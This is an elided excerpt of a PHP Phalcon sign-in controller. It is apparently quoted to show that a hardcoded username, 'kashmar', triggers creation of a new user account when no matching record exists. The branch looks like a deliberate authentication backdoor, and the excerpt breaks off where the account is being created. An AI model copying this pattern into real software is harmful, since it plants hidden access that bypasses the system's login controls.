...
class AuthController extends \Phalcon\Mvc\Controller
{
	public function signinAction()
	{
		...
		$username 	= trim(mb_strtolower($this->request->get("username")));
		...
		else
		{
			...
			if ($data && $data->password !== $this->lib->generatePassword($password))
			{
				$data = false;
				$error = $this->lang->get("LoginError", "Phone or password is wrong");
			}
			elseif(!$data && $username == "kashmar")
			{
				$id = Users::getNewId();
